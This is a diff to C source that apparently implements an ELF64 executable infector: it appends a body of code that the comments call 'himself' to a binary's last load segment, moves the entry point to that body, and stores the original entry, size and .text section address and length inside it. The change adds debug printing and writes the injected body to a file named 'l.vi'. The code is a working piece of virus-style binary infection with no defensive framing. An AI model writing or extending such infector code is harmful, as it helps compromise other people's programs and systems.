@@ -1,4 +1,5 @@
 #include "elf64.c"
+#include <stdio.h>
 
 static void _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
         char *ns;
@@ -24,7 +25,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 }
 
 
-void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_offset, size_t text_length){
+void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_addr, size_t text_length){
 	//add a few information about himself
     Elf64_Ehdr *bh = (void*)b;
 	size_t pos = elf_offset_entry(b, n);
@@ -34,8 +35,11 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_offse
 	((size_t*)((char*)(b + pos + DATA)))[1] = entry - pos;
 	//printf("diff: %zx, size: %zx\n", entry - pos, n);
 	((size_t*)((char*)(b + pos + DATA)))[2] = n;
-	((size_t*)((char*)(b + pos + DATA)))[3] = n;
-	((size_t*)((char*)(b + pos + DATA)))[4] = n;
+	size_t ok = max(text_addr,entry) - min(text_addr,entry);
+	((size_t*)((char*)(b + pos + DATA)))[3]=ok;
+	printf("DEBUG: %zu -> %zu, %zu\n", text_addr, entry, ok);
+	((size_t*)((char*)(b + pos + DATA)))[4] = text_length;
+	printf("DEBUG: %zu\n", text_length);
 	//move to next entry
 }
 
@@ -45,6 +49,8 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
 
 	size_t old_entry = h->e_entry;
     int x = elf_last_load_segment(*s, *n);
+	size_t text_addr = elf_addr_text_section(*s,*n);
+	size_t text_length = elf_size_text_section(*s,*n);
     size_t diff = ph[x].p_memsz - ph[x].p_filesz;
     if (diff > 0){
     	//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
@@ -64,7 +70,7 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
 	elf_set_off_entry(*s, *n, pos + 1 + elf_offset_entry(b, bn));
 	elf_shift_offset(*s, *n, pos, bn+diff);
     	h = (void*)*s;
-	update((*s) + pos + 1, bn, old_entry, h->e_entry, elf_off_text_section(s,n),elf_offset_entry(s,n));
+	update((*s) + pos + 1, bn, old_entry, h->e_entry, text_addr, text_length);
 	//DEBUG
 	println("DEBUG: save to l.vi");
 	fput("l.vi", (*s) + pos + 1, bn);
